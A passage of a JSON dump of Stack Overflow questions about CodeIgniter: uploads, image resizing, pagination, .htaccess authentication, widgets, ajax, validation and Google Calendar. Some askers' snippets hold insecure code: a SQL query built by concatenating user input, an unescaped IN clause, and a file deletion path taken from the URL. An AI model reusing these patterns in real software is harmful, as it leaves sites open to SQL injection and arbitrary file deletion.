1;\n    echo \"&lt;div class='span-6 last'&gt;&lt;span&gt;Image Order #:&lt;/span&gt;\" . form_dropdown('order', $order) . \"&lt;/div&gt;&lt;div class='span-14'&gt;&amp;nbsp;&lt;/div&gt;\";\n    $conf = array('name' =&gt; 'alt_text', 'size' =&gt; '75');\n    echo \"&lt;div class='span-14 last'&gt;&lt;span&gt;Discription:&lt;/span&gt;\" . form_input($conf) . \"&lt;br /&gt;&lt;/div&gt;\";\n    echo form_hidden('propertyID', \"$propertyID\");\n    echo form_submit('upload', 'Upload');\n    echo form_close();\n?&gt;\n\nController:\nclass Admin extends Controller\n{\n    function galleryUpload()\n    {\n        if (! $this-&gt;session-&gt;userdata('is_admin'))\n        {\n            redirect('admin/index');\n        }\n        else\n        {\n            $this-&gt;load-&gt;model('admin_model');\n            $this-&gt;admin_model-&gt;imgUpload();\n        }\n    }\n}\n\nModel:\nclass Admin_model extends Model\n{\n    function imgUpload()\n    {\n        $id = $this-&gt;input-&gt;post('propertyID');\n        $order = $this-&gt;input-&gt;post('order');\n        $alt_text = $this-&gt;input-&gt;post('alt_text');\n\n        $config = array(\n                'allowed_types' =&gt; 'jpg|jpeg|gif|png',\n                //'upload_path' =&gt; '../' . $this-&gt;imgPath($id),\n                'upload_path' =&gt; '../img/galleries/temp/',\n                'max_size' =&gt; '5000', // 5MB files max\n                );\n\n        $this-&gt;load-&gt;library('upload', $config);\n        $this-&gt;upload-&gt;do_upload();\n        $image_data = $this-&gt;upload-&gt;data();\n\n        $config = array(\n                'source_image' =&gt; $image_data['full_path'],\n                'new_image' =&gt; $this-&gt;imgPath($id) . '/thumbs',\n                'maintain_ratio' =&gt; TRUE,\n                'width' =&gt; '60'\n                );\n        $this-&gt;load-&gt;library('image_lib', $config);\n        $this-&gt;image_lib-&gt;resize();\n    }\n}\n</code></pre>\n"},{"tags":["php","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":27,"score":0,"question_id":12290660,"title":"Where to keep the converted non-national character keyword data in codeigniter?","body":"<p>I have simple search engine with paginated results in my codeigniter application. When I send results into function, it queries database and makes pagination:</p>\n\n<pre><code> function keyword_search($keyword, $from){...}\n</code></pre>\n\n<p>I have simple, basic codeigniter pagination based on standard pagination library. It all goes well until I'm trying to use national polish characters in search, i'm using </p>\n\n<pre><code>urldecode($keyword) \n</code></pre>\n\n<p>inside keyword_search() and it queries database well, but the problem is, when I'm trying to paginate. The perfect solution would be to convert these national characters into some universal ones, push this value in url and when my APP will se this converted string in URL, it will search for my native not-converted string (it's good to not have national chars for SEO purposes too).</p>\n\n<p>For making a solution, let's say, that function, which converts polish characters into english ones is </p>\n\n<pre><code>$this-&gt;polish_characters($keyword);\n</code></pre>\n\n<p>Where should I keep my original search string, which I want to search for by the time I will be pushing the converted one in URL for pagination purposes?</p>\n"},{"tags":["codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":79,"score":0,"question_id":12290616,"title":"CodeIgniter - Passing two variables from view to controller function","body":"<p>I am trying to pass two variables from the view to the controller. One is the $id of a row that I want to delete from the database. This is working. The other is the $filename of an image that I want to remove from the uploads folder at the same time. I get a server error and I am not sure how else to go about doing this. I am sure it is something simple. Any ideas? Thanks.</p>\n\n<p>//view</p>\n\n<pre><code>&lt;input type=\"button\" onClick=\"location.href = '&lt;?php echo site_url(\"myfunction/delete/{$row['id']}/{$row['file_name']}\"); ?&gt;'\" value=\"Delete\" /&gt;\n</code></pre>\n\n<p>//controller</p>\n\n<pre><code>public function delete($id, $file_name) {\n\n    $table_name = $this-&gt;table_name;\n    delete_files('../uploads/$file_name');\n\n    $this-&gt;load-&gt;model('delete', 'delete_model');\n    $this-&gt;delete_model-&gt;delete_row($id, $table_name);\n\n    redirect(site_url('site'));\n}\n</code></pre>\n"},{"tags":["php","mvc","codeigniter","templates"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":38,"score":1,"question_id":12290094,"title":"(Icon) helpers in views/templates (CodeIgniter)","body":"<p>I'm trying to get a grip on CodeIgniter. In my view I use the template parser, like this:</p>\n\n<pre><code>{blog_entries}\n&lt;h5&gt;{title}&lt;/h5&gt;\n&lt;p&gt;{body}&lt;/p&gt;\n{/blog_entries}\n</code></pre>\n\n<p>Now I want to use an icon font to display icons within a blog entry. This icon font may change in the future so I want to create an icon font helper (and I think I know how do that). Writing for example <code>edit_icon('span')</code> would produce the HTML <code>&lt;span class=\"icon\"&gt;*&lt;/span&gt;</code> where <code>*</code> is whatever character that gives me an edit icon.</p>\n\n<p>My question is: should this helper be used in the view or in the controller? This <code>&lt;span&gt;</code> would obviously need a link around it. So should I go about it like this:</p>\n\n<pre><code>{blog_entries}\n&lt;h5&gt;{title} &lt;a href=\"{edit_link}\"&gt;&lt;?php echo edit_icon('span') ?&gt;&lt;/a&gt;&lt;/h5&gt;\n&lt;p&gt;{body}&lt;/p&gt;\n{/blog_entries}\n</code></pre>\n\n<p>or should the whole <code>&lt;a href=\"{edit_link}\"&gt;&lt;?php echo edit_icon('span') ?&gt;&lt;/a&gt;</code> be saved in the <code>$data</code> variable and passed on to the parser? How would you go about it?</p>\n"},{"tags":[".htaccess","codeigniter","digest-authentication"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":81,"score":0,"question_id":12281375,"title":"CodeIgniter protect admin controller with .htaccess","body":"<p>I need to setup .htaccess rules in order to protect admin controller in CodeIgniter.</p>\n\n<p>In .htaccess already have rules for friendly URLs like this:</p>\n\n<pre><code>RewriteEngine On\nRewriteBase /\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule ^(.*)$ index.php?/$1 [L]\n</code></pre>\n\n<p>How to add additional rules to protect all under /admin/ folder (controller) with Digest authentication?</p>\n\n<p>I have tried various combinations but none works correct. Here are some rules which I tried just to get clues what I'm looking for:</p>\n\n<pre><code># set an environtment variable \"doauth\" if the request starts with \"/admin/\"\nSetEnvIf Request_URI ^/admin/ doauth=1\n\nAuthType Digest\nAuthName \"Admin Protected Area\"\nAuthUserFile /hta/.htdigest\n\n# Here is where we allow/deny\nOrder Allow,Deny\nAllow from all\nRequire valid-user\nDeny from env=doauth\nSatisfy any \n</code></pre>\n"},{"tags":["php","codeigniter"],"answer_count":4,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":847,"score":2,"question_id":6209765,"title":"Codeigniter issue with escaping values when passing array to query with \"in\" in the where clause","body":"<p>I have the function below in my model for a codeigniter project, and the variable <code>$id</code> is an array and for example, contains <code>(1,2,3)</code>. Now that i'm revisiting it, I think that i'm not actually escaping my array <code>$id</code>. I think I would have to change the line \n<code>$this-&gt;db-&gt;escape($id)</code>\nto\n<code>$id = $this-&gt;db-&gt;escape($id)</code></p>\n\n<p>If I do that, then it puts single quotes around every element in the array and treats it as one long string like this: <code>'(1,2,3)'</code>. </p>\n\n<p>Can someone confirm that I am not actually escaping my variable and either suggest a solution or let me know if this is a bug within the codeigniter framework?</p>\n\n<pre><code>function get_ratings($id)\n    {\n\n        $this-&gt;db-&gt;escape($id); // had to manually escape the variable since it's being used in an \"in\" in the where clause. \n\n        $sql = \"select * from toys t\n                 where t.toy_id in ($id)\";\n\n        $query = $this-&gt;db-&gt;query($sql, $id);\n\n        if($query-&gt;num_rows() &gt; 0)\n        {\n            return $query-&gt;result_array();\n        }\n        else\n        {\n            return false;\n        }\n    }\n</code></pre>\n"},{"tags":["php","codeigniter","file-upload"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":104,"score":0,"question_id":12285235,"title":"Code Igniter File Upload - No File Type","body":"<p>I've been scouring the Code Igniter forums for the past hour trying to figure this one out:</p>\n\n<p>I'm writing a file upload handler for a web application using Code Igniter. I have the following code to handle the upload so far:</p>\n\n<pre><code>public function send() {        \n    $config = array(\n        'upload_path' =&gt; 'path/to/my/upload/directory',\n        'allowed_types' =&gt; 'pdf'\n    );\n\n    $this-&gt;load-&gt;library('upload', $config);\n\n    $this-&gt;upload-&gt;do_upload('pdf_upload');\n\n    echo \"&lt;pre&gt;\";\n    print_r($this-&gt;upload-&gt;data());\n    echo \"&lt;/pre&gt;\";\n    exit();\n}\n</code></pre>\n\n<p>And my view:</p>\n\n<pre><code>&lt;?= $errors ?&gt; &lt;br /&gt;\n&lt;?= form_open_multipart('/Upload_test/send') ?&gt;\n    &lt;p&gt;&lt;label for=\"pdf_upload\"&gt;File: (PDF ONLY)&lt;/label&gt; &lt;input type=\"file\" name=\"pdf_upload\" id=\"pdf_upload\" /&gt;&lt;/p&gt;\n    &lt;p&gt;&lt;input type=\"submit\" /&gt;&lt;/p&gt;\n&lt;/form&gt;\n</code></pre>\n\n<p>When I submit the form with a valid PDF file selected, I get the following output from <code>print_r()</code>:</p>\n\n<pre><code>Array\n(\n    [file_name] =&gt; my_file.pdf\n    [file_type] =&gt; \n    [file_path] =&gt; path/to/my/upload/directory/\n    [full_path] =&gt; path/to/my/upload/directory/my_file.pdf\n    [raw_name] =&gt; my_file\n    [orig_name] =&gt; \n    [client_name] =&gt; my_file.pdf\n    [file_ext] =&gt; .pdf\n    [file_size] =&gt; 4190\n    [is_image] =&gt; \n    [image_width] =&gt; \n    [image_height] =&gt; \n    [image_type] =&gt; \n    [image_size_str] =&gt; \n)\n</code></pre>\n\n<p><strong>The file type is blank.</strong> What could be causing this? What am I missing?</p>\n"},{"tags":["codeigniter","module","widget"],"answer_count":1,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":61,"score":0,"question_id":12269287,"title":"Codeigniter widget plugin resulting in error","body":"<p>I'm trying to setup the Widget plugin by wiredesignz at <a href=\"http://codeigniter.com/forums/viewthread/109584/P20\" rel=\"nofollow\">http://codeigniter.com/forums/viewthread/109584/P20</a> but I keep getting the error. I am pretty sure I have everything setup as directed in the thread, but I'm getting the following when I try <code>&lt;?php widget::run(\"test\"); ?&gt;</code> in my view: </p>\n\n<pre><code>class Test extends Widget { function run() { echo \"test\"; } } \nFatal error: Class 'Test' not found in C:\\xampp\\htdocs\\test\\application\\helpers\\widget_helper.php on line 52\n</code></pre>\n\n<p>The only thing I can think of that is different about my install is that I'm using Phil Sturgeon's template library.</p>\n\n<p>Here is how I have everything structured:</p>\n\n<p><strong>/application/helpers/widget_helper.php</strong></p>\n\n<pre><code>&lt;?php if (!defined('BASEPATH')) exit('No direct script access allowed');\n/**\n * Widget Plugin \n * \n * Install this file as application/plugins/widget_pi.php\n * \n * @version:     0.21\n * $copyright     Copyright (c) Wiredesignz 2009-09-07\n * \n * Permission is hereby granted, free of charge, to any person obtaining a copy\n * of this software and associated documentation files (the \"Software\"), to deal\n * in the Software without restriction, including without limitation the rights\n * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell\n * copies of the Software, and to permit persons to whom the Software is\n * furnished to do so, subject to the following conditions:\n * \n * The above copyright notice and this permission notice shall be included in\n * all copies or substantial portions of the Software.\n * \n * THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n * THE SOFTWARE.\n */\nclass Widget\n{\n    public $module_path;\n\n    function run($file) {        \n        $args = func_get_args();\n\n        $module = '';\n\n        /* is module in filename? */\n        if (($pos = strrpos($file, '/')) !== FALSE) {\n            $module = substr($file, 0, $pos);\n            $file = substr($file, $pos + 1);\n        }\n\n        list($path, $file) = Modules::find($file, $module, 'widgets/');\n\n        if ($path === FALSE) {\n            $path = APPPATH.'widgets/';\n        }\n\n        Modules::load_file($file, $path);\n\n        $file = ucfirst($file);\n        $widget = new $file();\n\n        $widget-&gt;module_path = $path;\n\n        return call_user_func_array(array($widget, 'run'), array_slice($args, 1));    \n    }\n\n    function render($view, $data = array()) {\n        extract($data);\n        include $this-&gt;module_path.'views/'.$view.EXT;\n    }\n\n    function load($object) {\n        $this-&gt;$object = load_class(ucfirst($object));\n    }\n\n    function __get($var) {\n        global $CI;\n        return $CI-&gt;$var;\n    }\n} \n</code></pre>\n\n<p><strong>/application/widgets/test.php</strong></p>\n\n<pre><code>class Test extends Widget {\n\n    function run() {\n        echo \"test\";\n    }\n\n} \n</code></pre>\n\n<p>/application/views/layouts/public.php</p>\n\n<pre><code>&lt;?php widget::run(\"test\"); ?&gt;\n</code></pre>\n\n<p>Any idea how I can get this working? Is this just outdated?</p>\n\n<p>I've been searching for a better solution to do Widgets but I can't seem to find any. I just need to be able to control what appears on the site sidebar on a page-by-page basis. Are there any alternative methods?</p>\n\n<p>EDIT: Error's from widget library in comments</p>\n\n<pre><code>A PHP Error was encountered\n\nSeverity: Notice\n\nMessage: Undefined property: CI_Lang::$active_lang\n\nFilename: libraries/widgets.php\n\nLine Number: 26\n\nA PHP Error was encountered\n\nSeverity: Notice\n\nMessage: Undefined property: Page::$sys_lib\n\nFilename: libraries/widgets.php\n\nLine Number: 87\n\nA PHP Error was encountered\n\nSeverity: Notice\n\nMessage: Trying to get property of non-object\n\nFilename: libraries/widgets.php\n\nLine Number: 27\n\nA PHP Error was encountered\n\nSeverity: Notice\n\nMessage: Undefined property: CI_Lang::$active_lang\n\nFilename: libraries/widgets.php\n\nLine Number: 26\n\nA PHP Error was encountered\n\nSeverity: Notice\n\nMessage: Undefined property: Page::$sys_lib\n\nFilename: libraries/widgets.php\n\nLine Number: 87\n\nA PHP Error was encountered\n\nSeverity: Notice\n\nMessage: Trying to get property of non-object\n\nFilename: libraries/widgets.php\n\nLine Number: 27\n</code></pre>\n"},{"tags":["php","codeigniter","codeigniter-routing"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":70,"score":0,"question_id":12274669,"title":"mvc configuration on web server","body":"<p>I recently uploaded my codeigniter project onto my web server.</p>\n\n<p>it's in a folder called project1 this is what my directory view looks like</p>\n\n<pre><code>[www.myurl.com]\n  |-&gt; project1\n        |-&gt; application\n        |-&gt; css\n        |-&gt; images\n        |-&gt; js\n</code></pre>\n\n<p>I am having two problems. </p>\n\n<p>The first is that I want it to load my welcome view when I go to (www.myurl.com)  and not\n(www.myurl.com/project1/main_controller/index.php/welcome). How do i get rid of all that garbage? </p>\n\n<p>The second problem is when I use <code>&lt;?php echo base_url();?&gt;</code> it shows up fine in view source but when I click on it, it echo's the url [www.myurl.com/project1/www.myurl.com/project1/] why is it doing this?</p>\n"},{"tags":["php","codeigniter"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":37,"score":0,"question_id":12278066,"title":"Codeigniter Message: Undefined propertystdClass::$My First Blog","body":"<p>I just started to learn CodeIgnighter and I face lot many problems.</p>\n\n<p>I made one Controller and one view which is given below.</p>\n\n<p>This is My Controller</p>\n\n<pre><code>&lt;?php\n class Blog extends CI_Controller{\n\nfunction __construct() {\n    parent::__construct();\n}\n\nfunction index(){\n\n    $data['title'] = \"My First Blog\";\n    $data['heading'] = \"My Blog Heading\";\n    $data['query'] = $this-&gt;db-&gt;get('entries');\n\n    $this-&gt;load-&gt;view('blog_view' ,$data);\n}\n}\n\n?&gt;\n</code></pre>\n\n<p>This is my View.</p>\n\n<pre><code>&lt;html&gt;\n&lt;head&gt;\n    &lt;title&gt;&lt;?=$title?&gt;&lt;/title&gt;\n&lt;/head&gt;\n&lt;body&gt;\n    &lt;h1&gt;&lt;?=$heading?&gt;&lt;/h1&gt;\n    &lt;?php foreach ($query-&gt;result() as $row): ?&gt;\n\n        &lt;h3&gt;&lt;?=$row-&gt;$title?&gt;&lt;/h3&gt;\n        &lt;p&gt;&lt;?=$row-&gt;$body?&gt;&lt;/p&gt;\n\n     &lt;hr&gt;\n    &lt;?php endforeach;?&gt; \n\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre>\n\n<p>When I execute this so I get this error.</p>\n\n<pre><code>PHP Error was encountered\nSeverity: Notice\nMessage: Undefined property: stdClass::$My First Blog\nFilename: views/blog_view.php\nLine Number: 9\n</code></pre>\n\n<p>Now I don't know what is wrong in this code.</p>\n"},{"tags":["codeigniter"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":82,"score":0,"question_id":12274630,"title":"Codeigniter Single Image into Multiple Resize","body":"<p>I am new to Codeigniter. This is what I want to do: </p>\n\n<ol>\n<li>User uploads a profile picture.</li>\n<li>I resize the original image to several sizes, e.g. 400×300, 200×200, and 32×32.</li>\n</ol>\n\n<p>But what I when I upload the image is that it's re-sized successfully <em>only for one</em> dimension, 400×300.</p>\n\n<p>Here is my code:</p>\n\n<pre><code> $config['image_library']   = 'gd2';\n $config['source_image']    = '/path/to/image/mypic.jpg';\n $config['create_thumb']    = TRUE;\n $config['maintain_ratio']  = TRUE;\n $config['width']           = 400;\n $config['height']          = 300;\n $config['new_image']   = 400x300image;\n $this-&gt;load-&gt;library('image_lib', $config); \n $this-&gt;image_lib-&gt;resize();\n $this-&gt;image_lib-&gt;clear()\n\n $config['image_library']   = 'gd2';\n $config['source_image']    = '/path/to/image/mypic.jpg';\n $config['create_thumb']    = TRUE;\n $config['maintain_ratio']  = TRUE;\n $config['width']           = 200;\n $config['height']          = 200;\n $config['new_image']   = 200x200image;\n $this-&gt;load-&gt;library('image_lib', $config); \n $this-&gt;image_lib-&gt;resize();\n $this-&gt;image_lib-&gt;clear()\n\n $config['image_library']   = 'gd2';\n $config['source_image']    = '/path/to/image/mypic.jpg';\n $config['create_thumb']    = TRUE;\n $config['maintain_ratio']  = TRUE;\n $config['width']           = 32;\n $config['height']          = 32;\n $config['new_image']   = 32x32image;\n $this-&gt;load-&gt;library('image_lib', $config); \n $this-&gt;image_lib-&gt;resize();\n $this-&gt;image_lib-&gt;clear();\n</code></pre>\n\n<p>I tried using different config names like <code>$config2</code> and <code>$config3</code> but I did't get the output. </p>\n\n<p>Please help me to solve the issue.</p>\n"},{"tags":["php","codeigniter"],"answer_count":6,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":105,"score":2,"question_id":11914783,"title":"Can I safely remove the index.html file in every directory within codeigniter?","body":"<p>Every sub directory inside the directories 'application' and 'system' in my codeingiter web application has an index.html file. Inside this HTML file there is what looks to be a standard error message. It contains this code:</p>\n\n<pre><code>&lt;html&gt;\n    &lt;head&gt;\n        &lt;title&gt;403 Forbidden&lt;/title&gt;\n    &lt;/head&gt;\n    &lt;body&gt;\n        &lt;p&gt;Directory access is forbidden.&lt;/p&gt;\n    &lt;/body&gt;\n&lt;/html&gt;\n</code></pre>\n\n<p>I assume these are created so that if anyone tried to visit a directory inside either 'application' or 'system' it wouldn't list all the files, but would instead show an error.</p>\n\n<p>These seem redundant though as I have added an .htaccess in each directory to deny all access. Every PHP file in those two directories also has the first line:</p>\n\n<pre><code>if ( ! defined('BASEPATH')) exit('No direct script access allowed');\n</code></pre>\n\n<p>Which should mean that no one can view any of those files at all (as I am protected once by the .htaccess and once by that line of PHP).</p>\n\n<p>Therefore my question is - in the interest of keeping my web application organised and clutter free, can I safely remove these index.html files? Will this cause any bad side effects to my codeigniter web application?</p>\n\n<p>Thanks in advance</p>\n"},{"tags":["php","codeigniter"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":94,"score":0,"question_id":6029348,"title":"Image lib - can`t reduce the quality of a image","body":"<p>Im trying to reduce the quality of uploaded image. Here is my code </p>\n\n<pre><code>$image_config['source_image'] = 'file.jpg';\n$image_config['maintain_ratio'] = TRUE;\n$image_config['quality']    = '30%';\n$image_config['width'] = 1680;\n$image_config['height'] = 1050;\n\n$this-&gt;load-&gt;library('image_lib', $image_config);\n$this-&gt;image_lib-&gt;resize();\n</code></pre>\n\n<p>The problem is so image has the same quality as the file.jpg etc it is not reduced.</p>\n"},{"tags":["mysql","query","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":54,"score":0,"question_id":12257877,"title":"Searching MySQL DB using PHP","body":"<p>I use CodeIgniter + MySQL.</p>\n\n<p>I am succeeding in running this query and parsing the result.</p>\n\n<pre><code>$var1 = $this-&gt;db-&gt;query(\"select title from stores where title like \\\"\" . $str . \"%\\\" union select title from coupons where title like \\\"\" . $str . \"%\\\"\");\nreturn $var1;\n</code></pre>\n\n<p>And in the controller, I parse the <code>result()</code> of this query to a JSON file using <code>json_encode</code> </p>\n\n<p>But when I run the same query on another table, and follow the same step in parsing, I am facing parsing problems.</p>\n\n<pre><code>$var1 = $this-&gt;db-&gt;query(\"select tagword from tags where tagword like \\\"\" . $str .\"%\\\"\");\n</code></pre>\n\n<p>Am I doing something wrong here?</p>\n"},{"tags":["php","image","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":81,"score":1,"question_id":12272576,"title":"PHP + CodeIgniter: ImageCreateFromJPEG not loading image","body":"<p>Hi I'm new to PHP and CodeIgniter and I have the following problem</p>\n\n<p>I have a controller in which I want to call a PHP funnction that is defined on another .php.</p>\n\n<p>This is the function:</p>\n\n<pre><code>function createNote($note_text){\n     header('Content-type: image/jpeg');\n     $note = \"./application/controllers/notes/note.jpg\";\n     $rImg = ImageCreateFromJPEG($note);\n     imagejpeg($rImg);\n\n    //After this I want to use the \"imagettftext\" function to insert the $note_text in\n    //the image   \n}\n</code></pre>\n\n<p>This is suposed to load that image and show it (I guess) but it doesn't, instead it shows the following: </p>\n\n<p><img src=\"http://i.stack.imgur.com/XdrWJ.png\" alt=\"enter image description here\">\nI know the path to the image is correct because if I change it the ImageCreateFromJPEF returns an error saying that the image was not found...</p>\n\n<p>Any ideas?</p>\n\n<p>Thanks in advance!</p>\n"},{"tags":["javascript","ajax","codeigniter","pjax","script-tag"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":97,"score":0,"question_id":12272647,"title":"loading scripts when pjax do its job","body":"<p>i have project in MVC CodeIgniter framework and i have for each view its javascripts, and it is on end of that view.</p>\n\n<p>Now when pjax load that page, it should load script, but it doesnt.\nScript tag is there, but its not loaded, need somehow to load it on pjax ?</p>\n\n<pre><code>&lt;script&gt;\n    $(document).ready(function() {\n        $('body').on('change', '#grad, #adresa', function() {\n            adresa = getAddress();\n            marker.codeAddress(adresa);\n        });\n        $('#form').validator({message : ''});\n        .\n        .\n        . // more functions\n\n\n    } );\n&lt;/script&gt;\n</code></pre>\n\n<p>Any help ?</p>\n"},{"tags":["codeigniter","kohana"],"answer_count":3,"favorite_count":3,"up_vote_count":14,"down_vote_count":0,"view_count":5163,"score":14,"question_id":8829273,"title":"Kohana vs CodeIgniter... nowdays (2012)","body":"<p>I have been reading alot in the past days about PHP frameworks, but seems most of the information I found is a bit outdated.</p>\n\n<p><strong>Some information:</strong></p>\n\n<ul>\n<li>I am starting to working on a new big project which is expected to have around 50k to 60k daily visistors;</li>\n<li>I am not used to work with PHP frameworks. Have coded PHP for some years without any framework;</li>\n<li>I have some knowledge in OOP - have worked with C#;</li>\n</ul>\n\n<p>I would like to know if CI is nowdays more focused in OOP and PHP 5.x rather than PHP 4 (something I usually read was a cons.), not having Auth modules and not offer as much freedom;</p>\n\n<p>Kohana was said to make updates that would destroy the compatibility with previous code... Lack of docs and small community;</p>\n\n<p>How are all those things today?</p>\n\n<p>For a long-term project, which one offers a more rock-solid basis? What about performance, future expanding opportunity?</p>\n\n<p>Thanks.</p>\n"},{"tags":["php","ajax","json","codeigniter"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":84,"score":1,"question_id":12271663,"title":"CodeIgniter return data from controller","body":"<p>I'm using CodeIgniter for a project I'm working on.</p>\n\n<p>I have an ajax call in a view like this:</p>\n\n<pre><code>$.ajax({\n    type: 'GET',\n    url: 'extra/search/infojson/' + $(this).text().replace(/\\s/g, \"+\");\n    success: function(data) {\n        /* Do something with that data */\n    }\n\n});\n</code></pre>\n\n<p><code>infojson</code> is a method in a controller that takes a parameter of 'username', does a search, and will return a JSON object.  Is there any way I can return this data without having to create another view for it?  This method will only be used to return such data from this one page, so I can't see why I need to create another view just for that.  I've read about <code>_output()</code> but it didn't make any sense to me.</p>\n"},{"tags":["php","web-services","codeigniter","nusoap"],"answer_count":0,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":150,"score":0,"question_id":12271384,"title":"Create webservice using Nusoap that requires authentication on PHP","body":"<p>I have web service server using Nusoap on codeigniter, I wonder how I could add an authentication to it?</p>\n\n<p>thanks</p>\n"},{"tags":["ajax","wordpress",".htaccess","codeigniter","http-status-code-404"],"answer_count":2,"favorite_count":3,"up_vote_count":1,"down_vote_count":0,"view_count":2894,"score":1,"question_id":2393452,"title":"Ajax response call, 404 Not Found","body":"<p>i tried to use wordpress and codeigniter for a intelligent join between the best CMS and the best PHP Framework. Actually i intended to use codeigniter for database managemnent and wordpress for display. But i wanted to use codeigniter inside wordpress. So, i have a file tree like that:</p>\n\n<pre><code>www\n- codigniter-core folder\n  - .htaccess\n- wordpress-core folder\n- .htaccess\n- index.php\n</code></pre>\n\n<p>How can i make the wordpress .htaccess to cover also the codeigniter ant not trowing 404 error in jquery ajax call. My current wordpress .htaccess file it's:</p>\n\n<pre><code>&lt;IfModule mod_rewrite.c&gt;\n</code></pre>\n\n<p>RewriteEngine On\n RewriteBase /\n RewriteCond %{REQUEST_FILENAME} !-f\n #RewriteCond %{REQUEST_FILENAME} !-d\n RewriteCond $1 !^/codeigniter-core/\n RewriteRule ^(.*)$ /index.php/$1 [L]\n    </p>\n\n<p>I also tried to ask this to <a href=\"http://wordpress.org/support/topic/340291\" rel=\"nofollow\">Wordpress Forums</a> and Codeigniter Forums, but no answer. I think it's hell of a rewrite condition or rule, but i don't know ... </p>\n"},{"tags":["php","codeigniter","form-validation","codeigniter-form-helper"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":104,"score":0,"question_id":12258883,"title":"custom validation methods not working when using 'CI' in codeigniter form validation","body":"<p>hi i am using codeigniter form validation .</p>\n\n<p>in my libraray i set the form validation </p>\n\n<pre><code>$this-&gt;ci-&gt;form_validation-&gt;set_rules ( 'businessemail', 'Business Email', 'required|xss_clean|min_length[6]|callback_valid_email_check' );\n</code></pre>\n\n<p>and my <code>valid_email_check</code> function </p>\n\n<pre><code>public function valid_email_check($email_address)\n{\n    if(!trim($email_address))\n    {\n        return TRUE;\n    }\n    $email_explode = explode(\"@\", $email_address);\n\n    $valid = preg_match(\"/^(?![_.])(?!.*[_.]{2})[a-zA-Z0-9._]+(?&lt;![_.])$/\",trim($email_explode[0]));\n\n    if(!$valid)\n    {\n        $this-&gt;ci-&gt;form_validation-&gt;set_message('valid_email_check', 'The %s field contains invalid charaters');\n        return FALSE;\n    }\n    else\n    {\n        return TRUE;\n    }\n}\n</code></pre>\n\n<p>the thing is </p>\n\n<pre><code>required|xss_clean|min_length[6]\n</code></pre>\n\n<p>is validating correctly , only thing the custom validation message is not working .</p>\n\n<p>what have i done here , i think using <code>CI</code> , may be the issue , \nhow to solve this problem , thanks in advance </p>\n"},{"tags":["codeigniter"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":511,"score":1,"question_id":7590827,"title":"Codeigniter - Set a variable in in view","body":"<p>Can I set a variable in view file?</p>\n\n<p>for exemple:\nI have a controller: welcome.php\nIts load:</p>\n\n<pre><code>$this-&gt;load-&gt;view('header');\n$this-&gt;load-&gt;view('main');\n$this-&gt;load-&gt;view('footer');\n</code></pre>\n\n<p>I need set a variable on file main.php and get on footer.php</p>\n\n<p>Its possible? </p>\n"},{"tags":["codeigniter","google-api"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":43,"score":0,"question_id":12267747,"title":"deleting events by id on google calendar in php","body":"<p>I'm using google api to handle events in google calendar.And I don't know how to get event ID. I read that the only way to get it is when creating it, so I did this just to test:</p>\n\n<pre><code> function delete_event()\n        {\n        $this-&gt;load-&gt;library('gcal');\n        $date_start = $this-&gt;unix_timestamp('2012-09-21');\n        $date_end = $this-&gt;unix_timestamp('2012-09-22');\n\n        $paramsInsert = array(\n            'calendarId'    =&gt; 'myLogin@gmail.com',\n            'allday'        =&gt; true, \n            'start'         =&gt; $date_start,\n            'end'       =&gt; $date_end,\n            'summary'       =&gt; 'should be deleted',\n            'description'   =&gt; \"delete test\"\n        ); \n\n        $responseInsert = $this-&gt;gcal-&gt;eventInsert($paramsInsert); \n            $id=$responseInsert-&gt;id ;\n            $paramsDelete = array(\n                'calendarId'    =&gt; 'myLogin@gmail.com',\n                'eventId'       =&gt; $id\n\n        ); \n\n        $responseDelete = $this-&gt;gcal-&gt;eventDelete($paramsDelete); \n\n\n        if($responseDelete)\n        {\n            echo \"true\";\n        }\n        else {echo 'false';}\n        }\n</code></pre>\n\n<p>The event is inserted and I can print the event Id, but the responseDelete shows false. And the event isn't deleted from the calendar.\nCould anyone help me please?</p>\n"},{"tags":["php","mysql","codeigniter"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":100,"score":1,"question_id":12265559,"title":"Mysql confusion with LIMIT function","body":"<p>I am using the following SQL query in MySQL. </p>\n\n<pre><code>\"SELECT SUBSTRING(invoices.dateCreated, 